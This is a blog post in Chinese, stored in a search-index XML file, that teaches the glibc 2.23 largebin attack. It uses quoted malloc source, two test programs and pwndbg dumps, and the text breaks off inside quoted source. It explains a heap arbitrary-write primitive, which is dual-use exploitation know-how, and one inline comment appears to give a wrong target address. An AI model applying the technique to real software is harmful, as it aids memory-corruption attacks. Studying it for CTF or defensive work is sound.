<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Largebin attack</title>
    <url>/2025/03/26/largebin_attack/</url>
    <content><![CDATA[<p>文章是在初次学习largebin_attack时写的，有不准确的地方还望指正，文章中所用的环境基本都是ubuntu16.04</p>
<h2 id="了解largebin"><a href="#了解largebin" class="headerlink" title="了解largebin"></a>了解largebin</h2><p>了解largebin，首先要了解largebin的结构，下面是glibc源码的一部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以看出来，largebin中的chunk比其他的bins中的就够多出来了一部分就是<code>fd_nextsize</code>和<code>bk_nextsize</code></p>
<p><strong>什么样的大小才属于largebin？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br></pre></td></tr></table></figure>

<p>这是glibc中的宏定义，可以计算出：</p>
<ul>
<li>在64位程序下：MIN_LARGE_SIZE &#x3D; 64*0x10 &#x3D; 0x400;</li>
<li>在32位程序下：MIN_LARGE_SIZE &#x3D; 64*0x8 &#x3D; 0x200;</li>
</ul>
<p>大于MIN_LARGE_SIZE的chunk为large bin。</p>
<p><strong>largebin是如何管理的呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line"><span class="meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span></span><br><span class="line"><span class="meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span></span><br><span class="line"><span class="meta">   126)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) \</span></span><br><span class="line"><span class="meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span></span><br><span class="line"><span class="meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span></span><br><span class="line"><span class="meta">   : largebin_index_32 (sz))</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23源码1500行处</p>
<p>我们知道，fastbin有一个index，然后对应大小的bin放到对应index的bins里，largebin也类似，当一个bin被放入largebin时，首先根据size计算其对应的index，我们将0x400带入<code> 48 + (0x400 &gt;&gt; 6) = 64</code>，0x400~0x430带入largebin_index(sz)宏函数中计算后都是64，继续计算的话可以发现<strong>largebin中是在一个范围内chunk都属于同一个bin或index</strong>，因此以此类推，我们可以得到如下分布图：</p>
<p><img data-src="/../images/image-20250327153800287.png" alt="image-20250327153800287"></p>
<p><strong>我们知道了large bin是靠桶来管理不同index的chunk，不同index的chunk之间没有联系，那么在同一个index桶里，chunk之间有什么联系吗？</strong></p>
<p>Fd_nextsize指向比自己小的chunk，fd_bknextsize指向比自己大的chunk，最后一个chunk的fd_nextsize指向最后一个chunk，形成了<strong>双向链表</strong>，如下图：</p>
<p><img data-src="/../images/image-20250327161114374.png" alt="image-20250327161114374"></p>
<p><strong>假如多个一样大小的chunk怎么管理？</strong></p>
<p><img data-src="/../images/image-20250327162735558.png" alt="image-20250327162735558"></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><p>这个目的是了解<strong>同index不同大小的chunk</strong>的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);<span class="comment">//0x400</span></span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);<span class="comment">//0x410</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x420</span> - <span class="number">0x10</span>);<span class="comment">//0x420</span></span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//这里再申请一个是触发便利unsortedbin，使对应的chunk放入largebins中</span></span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;gcc -o test1 test1.c -g</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602850 —▸ 0x602420 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602850 /* <span class="string">&#x27;P(`&#x27;</span> */</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602850      0x0000000000602000</span><br><span class="line">    					<span class="comment"># 这个指向在当前index下最大那一组的头节点	这个指向在当前index下最小那一组的头节点</span></span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68#bk</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401#chunk A</span><br><span class="line">0x602010:       0x00007ffff7dd1f68      0x0000000000602420</span><br><span class="line">0x602020:       0x0000000000602850      0x0000000000602420#fd_nextsize --&gt; chunk C prev_size</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000#bk_nextsize --&gt; chunk B prev_size</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000411#chunk B</span><br><span class="line">0x602430:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602440:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421#chunk C</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这个目的是了解<strong>同index相同大小的chun</strong>k**的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o test2 test2.c </span></span><br><span class="line"><span class="comment">//read的作用是阻塞程序执行，./test2 ,ps -a 看pid, gdb ,attach pid</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602000 —▸ 0x602840 —▸ 0x602420 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602000</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602000      0x0000000000602420</span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602010:       0x0000000000602840      0x00007ffff7dd1f68</span><br><span class="line">0x602020:       0x0000000000602000      0x0000000000602000</span><br><span class="line"><span class="comment">#在相同index下没有其它大小的chunk，指向自身</span></span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602840</span><br><span class="line">0x602840:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602850:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602860:       0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#同样大小下除了头节点，其他的fd_nextsize和bk_nextsize为0</span></span><br><span class="line">0x602870:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602430:       0x00007ffff7dd1f68      0x0000000000602840</span><br><span class="line">0x602440:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;    </span><br></pre></td></tr></table></figure>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从源码分析largebin_attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size) &#123;</span><br><span class="line">    <span class="comment">// 判断当前操作的chunk的size是不是等于largebin中最大的size</span></span><br><span class="line">    <span class="comment">/* Always insert in the second position. */</span></span><br><span class="line">    fwd = fwd-&gt;fd;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 这是largebin_attack的核心</span></span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//##//addr2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//##//addr2-&gt;fd_nextsize = victim</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk;<span class="comment">//##//addr1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//##//addr2-&gt;fd = victim</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23中3700行左右的代码，加<code>//##//</code>的是largebin_attack的核心</p>
<p>该段代码是从unsorted bin里取出未归位的large bin时可能会触发的代码。什么叫未归位？当free一个块时，如果chunk没有放到fastbin或者tcache，那么就直接放到unsorted bin里。当接下来malloc符合某些条件时，会遍历unsorted bin，并根据chunk的size把chunk给放到对应的bin里，比如放到large bin、small bin等。</p>
<p>fwd指向的是large bin的某个头结点，而victim指向的是unsorted bin里当前遍历到的这个chunk。</p>
<p>先不考虑前面的条件，假设程序执行到此处，而我们利用UAF或其他漏洞<strong>控制了fwd的bk和bk_nexsize指针分别为addr1、addr2</strong>，那么，我们代入图中计算，得：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nexsize = victim <span class="comment">//向addr2+0x18处写入victim的地址</span></span><br><span class="line">addr1-&gt;fd = victim <span class="comment">//向addr2+0x10处写入victim的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>最终实现：往任意地址处写入一个堆地址（或一个大数）</strong></p>
<p><strong>那么怎么到达这里触发这些代码呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//这个 (nb) 是我们申请的大小，判断是不是在fastbin中，直接跳过</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里如果符合smallbin执行，也跳过</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span 